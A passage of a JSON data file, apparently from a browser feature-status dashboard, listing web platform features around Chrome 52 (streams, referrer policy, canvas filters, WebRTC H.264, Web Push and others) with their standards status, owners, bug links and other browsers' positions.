    "comments": "Since M43, readable streams can be obtained (only) from the body attribute of the Response. Developers can now construct their own ReadableStream instances (http://crbug.com/503491), and use one for constructing a Response and serve it from a ServiceWorker.\r\n\r\nThis feature had been available behind a flag since M49.\r\n\r\nA *Request* cannot yet be constructed with a ReadableStream as a body (for streaming uploads).\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1128959",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "domenic@chromium.org",
          "yhirano@chromium.org",
          "tyoshino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=564479",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=138967",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Developers can now construct their own ReadableStream instances, and use one as a body for constructing a Response object. It enables streaming composed body data from a ServiceWorker to a page controlled by it.",
    "id": 4531143755956224,
    "resources": {
      "docs": [
        "https://streams.spec.whatwg.org/#rs",
        "https://developers.google.com/web/updates/2016/06/sw-readablestreams"
      ],
      "samples": [
        "https://jakearchibald.com/2016/streams-ftw/"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:54.260410",
      "by": "ericbidelman@google.com"
    },
    "name": "Fetch API: referrer policy",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1251872",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=532385",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=153437",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature enables users to get / set a Request's referrer policy which affect's the \"Referer\" HTTP header.\r\n",
    "id": 5692236742262784,
    "resources": {
      "docs": [
        "https://hacks.mozilla.org/2016/03/referrer-and-cache-control-apis-for-fetch/",
        "https://developer.mozilla.org/en-US/docs/Web/API/GlobalFetch/fetch"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/fetch-api/fetch-referrer-policy.html"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-01-18 17:10:35.127260",
      "by": "jmedley@google.com"
    },
    "name": "Filters in 2D canvas",
    "tags": [
      "canvas",
      "filter",
      "css filters"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#filters",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1152918",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "ajuma@chromium.org",
          "junov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/501642",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add a string attribute called 'filter' to CanvasRenderingContext2D to apply effects to primitives drawn to the canvas.\r\n\r\nThe attributes is parsed the same way as CSS filters.",
    "id": 6701649301078016,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/filter"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:14.281060",
      "by": "ericbidelman@google.com"
    },
    "name": "H.264 software encoder/decoder in Chrome for WebRTC",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-rtcweb-video-06",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "hbos@chromium.org",
          "torbjorng@chromium.org",
          "hta@chromium.org",
          "tommi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=500605",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Include a H.264 video codec encoder and decoder in Chrome for use with WebRTC. At IETF in late november 2014, a compromise was reached with the main contributors to WebRTC to ship both VP8 and H.264. This launch is to follow up in this public commitment.\r\n\r\nThe plan is to use the OpenH264 (same lib as Firefox uses) for encoding and FFmpeg (which is already used elsewhere in Chrome) for decoding.",
    "id": 6417796455989248,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:09.168940",
      "by": "ericbidelman@google.com"
    },
    "name": "HTMLMediaElement.srcObject attribute",
    "comments": "The spec specifies that it must be possible assign MediaStream, MediaSource or Blob objects to the srcObject attribute. However, Blink will initially support only MediaStream objects.\r\nAll other browsers provide support only for MediaStream as well.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#media-elements",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.fxsitecompat.com/en-CA/docs/2015/htmlmediaelement-srcobject-has-been-unprefixed/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "guidou@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/595326",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2015/05/13/announcing-media-capture-functionality-in-microsoft-edge/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=121943",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The srcObject attribute allows associating a MediaStream to a media element using a simple assignment.\r\nPreviously, achieving this required first obtaining a URL associated to the MediaStream, and then associating this URL to the media element.\r\n",
    "id": 5989005896187904,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/srcObject"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-06-14 18:29:15.945920",
      "by": "ericbidelman@google.com"
    },
    "name": "IDBKeyRange.includes()",
    "tags": [
      "indexed db",
      "indexeddb",
      "idb",
      "idbkeyrange"
    ],
    "comments": "polyfill at https://developer.mozilla.org/en-US/docs/Web/API/IDBKeyRange/includes",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/IndexedDB/#dom-idbkeyrange-includes",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "jsbell@chromium.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=603759",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Test whether or not a key exists within the bounds of an IDBKeyRange.",
    "id": 6571252802125824,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBKeyRange/includes"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:45.693210",
      "by": "ericbidelman@google.com"
    },
    "name": "ImageBitmapOptions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/#imagebitmapoptions",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "xidachen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=249382",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "An ImageBitmapOptions is a dictionary object passed to the createImageBitmap(), such that an ImageBitmap can be created with specific format, for example, premultiplyAlpha = false.",
    "id": 5641240179638272,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ImageBitmapFactories/createImageBitmap"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-08-07 16:42:20.605190",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Throttle rendering pipeline based on viewport visibility",
    "comments": "In hopes of making this change web compatible, the throttling will only be done for documents in cross-origin frames. Because cross-origin frames cannot synchronously communicate with the outside world, there isn't a direct of observing the exact timing of the requestAnimationFrame callbacks within the frame. Also, note that pages already have to deal with requestAnimationFrame callbacks stopping completely for background tabs.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/webappapis.html#processing-model-8",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1145439",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 52
        },
        "owners": [
          "skyostil@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink>Paint"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=487937",
        "intervention": true
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "As an intervention, stop running Blink's rendering pipeline (including requestAnimationFrame callbacks) for content which isn't visible in the viewport. This helps to avoid doing unnecessary work for animations which aren't going to be seen by the user.",
    "id": 4514713492783104,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Dd4qi1b_iX-OCZpelvXxizjq6dDJ76XNtk37SZEoTYQ/edit"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:13.859990",
      "by": "ericbidelman@google.com"
    },
    "name": "Invalid <track kind> values behave like \"metadata\", not \"subtitles\"",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#attr-track-kind",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/d/topic/mozilla.dev.platform/42-W463M4Ig/discussion",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=608772",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Invalid values for <track kind> are currently treated as \"subtitles\". This means that any new values will be treated as subtitles by old UAs. Instead use \"metadata\" as the \"invalid value default\", to avoid UAs showing <track>s with unrecognized values.",
    "id": 6401997133578240,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:49.114810",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaDevices devicechange event",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/mediacapture-main/#event-mediadevices-devicechange",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1152383",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 52
        },
        "owners": [
          "guidou@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": true,
        "bug": "https://crbug.com/585096",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/mt131886(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The devicechange event is fired when a media device (e.g., camera, microphone or speaker) is connected to or removed from the system.\r\n\r\nThis feature is useful for applications that wish to react to changes in the set of available media devices; for example, to show a device list that is always up-to-date.  This is expected to be on by default in Chrome 57.",
    "id": 5662847321243648,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Events/devicechange"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:51.656920",
      "by": "ericbidelman@google.com"
    },
    "name": "Node.isConnected",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#dom-node-isconnected",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=599743",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The isConnected attribute’s getter returns true, if context object is in a shadow-including document, and false otherwise.",
    "id": 5676110549352448,
    "resources": {
      "docs": [
        "See the discussion here: https://github.com/w3c/webcomponents/issues/81"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:52.722610",
      "by": "ericbidelman@google.com"
    },
    "name": "Pause event loop during modal dialogs",
    "comments": "Chrome’s old behavior was implemented with a nested message loop on the Blink main thread.  Any code that might ever run on a nested message loop must be robust to reentrancy and reordering, otherwise there will be stability and security bugs.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/#pause",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "aelias@chromium.org",
          "changwan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "http://crbug.com/604675",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When using alert(), confirm() or onbeforeunload, Chromium's old behavior was to block JS waiting for the result, but allows all declarative animations to continue.  This change is to make all main-thread tasks (such as <marquee> and CSS 2d animations) also pause during this interval.",
    "id": 5683408571203584,
    "resources": {
      "samples": [
        "http://jsfiddle.net/sfc75sg6/10/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:29:08.750610",
      "by": "ericbidelman@google.com"
    },
    "name": "Performance Observer",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/performance-timeline/#the-performance-observer-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1165796",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "http://crbug.com/485613",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/performanceobserver",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Used to observe the Performance Timeline (http://w3c.github.io/performance-timeline) and be notified of new performance entries as they are recorded by the user agent",
    "id": 5945504202489856,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/performance-observer"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:02.879550",
      "by": "ericbidelman@google.com"
    },
    "name": "Push subscription restrictions, Web Push protocol",
    "tags": [
      "push",
      "notifications"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/w3c/push-api/pull/182/files",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hacks.mozilla.org/2016/01/web-push-arrives-in-firefox-44/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=583753",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Supporting server authentication and subscription restrictions from the following IETF draft, that will allow developers to provide a public key when subscribing for push upon which Chrome will return a Web Push protocol-compatible endpoint.\r\n\r\nhttps://tools.ietf.org/html/draft-thomson-webpush-vapid-02\r\n\r\nThis will enable us to move away from our current GCM implementation requirements.",
    "id": 5748876422152192,
    "resources": {
      "docs": [
        "https://tools.ietf.org/html/draft-thomson-webpush-vapid-02",
        "https://developer.mozilla.org/en-US/docs/Web/API/PushManager/subscribe"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:57.688820",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove density property from Manifest's icons",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/manifest/issues/450",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1264813",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 52
        },
        "owners": [
          "dominickn@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/603848",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove density property from Manifest's icons",
    "id": 5715015369752576,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Manifest"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:46.839770",
      "by": "ericbidelman@google.com"
    },
    "name": "Stricter user gestures for touch",
    "tags": [
      "tap popup blocker touch"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://docs.google.com/document/d/1oF1T3O7_E4t1PYHV6gyCwHxOi3ystm0eSL5xZu7nvOg/edit#heading=h.qq59ev3u8fba",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=582140",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Don't allow opening popups (and other sensitive operations) on touch events which don't correspond to a tap from inside of cross-origin iframes (Chrome 52).",
    "id": 5649871251963904,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/13",
        "https://developers.google.com/web/updates/2016/06/chrome-52-deprecations#block-pop-ups-from-cross-origin-iframes-during-touch-events-except-during-a-tap-gesture"
      ],
      "samples": [
        "http://rbyers.net/touch-popup-crossorigin.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-15 14:19:22.659400",
      "by": "pmeenan@chromium.org"
    },
    "name": "Stylesheets activated after the body is started do not block paint",
    "comments": "This is the existing Edge and Safari behavior (though the Safari implementation is different).\r\n\r\nFirefox is similar but does not pause the parser so that content after the external sheet is painted using the existing styles until the external sheet loads. Parser pausing can be achieved in Firefox by placing an empty script tag after the relevant sheets.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 52
        },
        "owners": [
          "pmeenan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": true,
        "android": 52,
        "bug": "http://crbug.com/481122",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "External stylesheets in the body of the document or that get activated after the body has started to be parsed will no longer block paint but they will pause the parser.  The end result is that any DOM content before the body stylesheet will continue to paint but content after the stylesheet will not appear until after the stylesheet has loaded.",
    "id": 5696805480169472,
    "resources": {
      "samples": [
        "http://test.patrickmeenan.com/css/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:54.317180",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio:  AudioParams include min/max attributes to specify the nominal range",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/594594",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
